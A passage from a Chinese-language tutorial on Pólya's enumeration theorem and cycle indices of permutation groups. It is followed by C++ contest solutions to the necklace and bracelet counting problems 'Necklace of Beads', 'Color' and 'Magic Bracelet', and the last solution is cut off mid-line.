$G$ 中的置换按照型的生成函数</p><script type="math/tex; mode=display">\sum_{f\in G} mon(f)=\sum_{f\in G}z_1^{e_1}z_2^{e_2}\dots z_n^{e_n} \tag{15}</script><p>合并公式(15) 中的同类型，$z_1^{e_1}z_2^{e_2}\dots z_n^{e_n}$ 的系数等于型为 $(e_1, e_2,\dots, e_n)$ 的 $G$ 中的置换个数。</p><p>$G$ 的<strong>循环指数</strong>定义为该生成函数除以 $G$ 中的置换个数 $G$，即</p><script type="math/tex; mode=display">P_G(z_1, z_2, \dots , z_n) = \frac 1 {|G|} \sum_{f\in G} z_1^{e_1}z_2^{e_2}\dots z_n^{e_n}</script><p><strong>定理4</strong> 设 $X$ 是有 $n$ 个元素的一个集合，假设有 $k$ 种可用的颜色集可用来对 $X$ 的元素进行着色。令 $C$ 是 $X$ 的所有 $k^n$ 种着色的集合，$G$ 是 $X$ 的一个置换群。则不等价的着色数是用 $z_i=k(i=1,2,\dots, n)$ 带入 $G$ 的循环指数中而得到的数，即</p><script type="math/tex; mode=display">N(G,C)=P_G(k,k,\dots, k)</script><p><strong>定理5（Polya定理）</strong> 设 $X$ 是一个元素集合，$G$ 是 $X$ 的一个置换群，$\{u_1, u_2, \dots, u_k\}$ 是 $k$ 种颜色的一个集合，$C$ 是 $X$ 的任意着色集并且 $G$ 为 $C$ 上的一个置换群，那么根据各颜色的数目，$C$ 的不等价着色数的生成函数是由循环指数 $P_G(z_1, z_2, \dots, z_n)$ 通过做变量代换</p><script type="math/tex; mode=display">z_j=u_1^j+\dots+u_k^j\ (j=1, 2, \dots, n)</script><p>而得到的表达式</p><script type="math/tex; mode=display">P_G(u_1+\dots+u_k, u_1^2+\dots+u_k^2,\dots, u_1^n+\dots+u_k^n) \tag{16}</script><p>换言之，公式(16) 中</p><script type="math/tex; mode=display">u_1^{p_1}u_2^{p_2}\dots u_k^{p_k}</script><p>的系数等于 $X$ 中的 $p_i$ 个元素着颜色 $u_i$ 的 $C$ 中不等价的着色数。</p><h1 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h1><h2 id="Necklace-of-Beads-1"><a href="#Necklace-of-Beads-1" class="headerlink" title="Necklace of Beads"></a>Necklace of Beads</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">int</span> __gcd(<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line"><span class="keyword">return</span> !x ? y : __gcd(y % x, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">kpow</span><span class="params">(ll a, ll b)</span> </span>&#123;</span><br><span class="line">ll r = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (b &amp; <span class="number">1</span>) r = r * a;</span><br><span class="line">a = a * a, b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n) &amp;&amp; ~n) &#123;</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"0"</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">ll ans = <span class="number">0</span>; </span><br><span class="line"><span class="comment">// rotation</span></span><br><span class="line">rep(i, <span class="number">0</span>, n) &#123;</span><br><span class="line">ll circ = __gcd(n, i);</span><br><span class="line">ans += kpow(<span class="number">3</span>, circ);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// relection</span></span><br><span class="line">ans += (<span class="number">2</span> + (n &amp; <span class="number">1</span>)) * n * kpow(<span class="number">3</span>, n / <span class="number">2</span>);</span><br><span class="line">ans /= <span class="number">2</span> * n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Color-1"><a href="#Color-1" class="headerlink" title="Color"></a>Color</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">31625</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, p;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; primes;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; isprime;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kpow</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> mod)</span> </span>&#123;</span><br><span class="line">a %= mod;</span><br><span class="line"><span class="keyword">int</span> r = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (b &amp; <span class="number">1</span>) r = r * a % mod;</span><br><span class="line">a = a * a % mod, b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">isprime.resize(N, <span class="literal">true</span>);</span><br><span class="line">isprime[<span class="number">0</span>] = isprime[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">rep(i, <span class="number">2</span>, N) <span class="keyword">if</span> (isprime[i]) &#123;</span><br><span class="line">primes.push_back(i);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; N; j += i)</span><br><span class="line">isprime[j] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phi</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = n;</span><br><span class="line">rep(i, <span class="number">0</span>, sz(primes)) <span class="keyword">if</span> (primes[i] &lt;= n) &#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;p = primes[i];</span><br><span class="line"><span class="keyword">if</span> (n % p == <span class="number">0</span>) &#123;</span><br><span class="line">ret -= ret / p;</span><br><span class="line"><span class="keyword">while</span> (n % p == <span class="number">0</span>) n /= p;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line">ret -= ret / n;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cases; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cases);</span><br><span class="line">rep(casei, <span class="number">0</span>, cases) &#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;p);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">1</span>; d * d &lt;= n; ++d) &#123;</span><br><span class="line"><span class="keyword">if</span> (n % d) <span class="keyword">continue</span>;</span><br><span class="line">ans += <span class="number">1l</span>l * kpow(n, d - <span class="number">1</span>, p) * phi(n / d) % p;</span><br><span class="line"><span class="keyword">if</span> (d * d != n) </span><br><span class="line">ans += <span class="number">1l</span>l * kpow(n, n / d - <span class="number">1</span>, p) * phi(d) % p;</span><br><span class="line">ans %= p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Magic-Bracelet-1"><a href="#Magic-Bracelet-1" class="headerlink" title="Magic Bracelet"></a>Magic Bracelet</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P = <span class="number">9973</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">31625</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, k;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prime;</span><br><span class="line"><span class="keyword">bool</span> isprime[N];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> a[M][M];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">rep(i, <span class="number">0</span>, m) rep(j, <span class="number">0</span>, m)</span><br><span class="line">a[i][j] = i == j ? x : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">rep(i, <span class="number">0</span>, m) rep(j, <span class="number">0</span>, m)</span><br><span class="line">a[i][j] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trace</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">rep(i, <span class="number">0</span>, m) ret += a[i][i];</span><br><span class="line"><span class="keyword">return</span> ret % P;</span><br><span class="line">&#125;</span><br><span class="line">Matrix <span class="keyword">operator</span>*(<span class="keyword">const</span> Matrix &amp;mat) <span class="keyword">const</span> &#123;</span><br><span class="line">Matrix r; r.init(<span class="number">0</span>);</span><br><span class="line">rep(i, <span class="number">0</span>, m) rep(j, <span class="number">0</span>, m) &#123;</span><br><span class="line">rep(k, <span class="number">0</span>, m) r.a[i][j] += a[i][k] * mat.a[k][j];</span><br><span class="line">r.a[i][j] %= P;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">Matrix <span class="keyword">operator</span>^(<span class="keyword">int</span> n) &#123;</span><br><span class="line">Matrix r, a = *<span class="keyword">this</span>;</span><br><span class="line">r.init(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &amp; <span class="number">1</span>) r = r * a;</span><br><span class="line">a = a * a, n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">inc</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((x += y) &gt;= P) x -= P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initPrime</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(isprime, <span class="number">1</span>, <span class="keyword">sizeof</span>(isprime));</span><br><span class="line">isprime[<span class="number">0</span>] = isprime[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">rep(i, <span class="number">2</span>, N) &#123;</span><br><span class="line"><span class="keyword">if</span> (isprime[i]) prime.push_back(i);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; i * prime[j] &lt; N; ++j) &#123;</span><br><span class="line">isprime[i * prime[j]] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (i % prime[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phi</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = n;</span><br><span class="line">rep(i, <span class="number">0</span>, sz(prime)) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; prime[i]) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (n % prime[i] == <span class="number">0</span>) &#123;</span><br><span class="line">ret -= ret / prime[i];</span><br><span class="line"><span class="keyword">while</span> (n % prime[i] == <span class="number">0</span>)</span><br><span class="line">n /= prime[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) ret -= ret / n;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> d, Matrix &amp;a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = (a ^ d).trace();</span><br><span class="line"><span class="keyword">return</span> phi(n / d) % P * fd % P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exgcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> &amp;x, <span class="keyword">int</span> &amp;y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!b) x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">exgcd(b, a % b, y, x);</span><br><span class="line">y -= a / b * x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inv</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">exgcd(n, P, x, y);</span><br><span class="line">x = (x % P + P) % P;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">initPrime();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cases; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cases);</span><br><span class="line"><span class="keyword">while</span> (cases-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line">Matrix a; a.fill(<span class="number">1</span>);</span><br><span class="line">rep(_k, <span class="number">0</span>, k) &#123;</span><br><span class="line"><span class="keyword">int</span> x, y; <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line">--x, --y;</span><br><span class="line">a.a[x][y] = a.a[y][x] 